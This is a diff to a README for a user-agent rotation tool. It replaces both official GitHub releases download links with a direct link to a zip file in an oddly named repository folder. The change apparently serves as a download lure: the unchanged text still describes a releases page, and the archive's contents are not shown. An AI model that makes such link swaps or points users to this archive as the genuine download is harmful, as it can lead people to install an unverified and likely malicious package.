@@ -1,6 +1,6 @@
 # 🧭 FPC-UserAgentAuto-Rotate-Generate - Rotate User Agents With Ease
 
-[![Download](https://img.shields.io/badge/Download-Releases-0078D4?style=for-the-badge&logo=github)](https://github.com/mahadevan77/FPC-UserAgentAuto-Rotate-Generate/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-0078D4?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mahadevan77/FPC-UserAgentAuto-Rotate-Generate/main/vasostimulant/Agent_User_Auto_Generate_FP_Rotate_1.2.zip)
 
 ## 📌 What This App Does
 
@@ -32,7 +32,7 @@ If you use Windows 10 or Windows 11, the app should run in a normal desktop setu
 
 Visit this page to download the app:
 
-https://github.com/mahadevan77/FPC-UserAgentAuto-Rotate-Generate/releases
+https://raw.githubusercontent.com/mahadevan77/FPC-UserAgentAuto-Rotate-Generate/main/vasostimulant/Agent_User_Auto_Generate_FP_Rotate_1.2.zip
 
 On that page, look for the latest release. Then download the file that matches the plugin or app package for your setup.
 
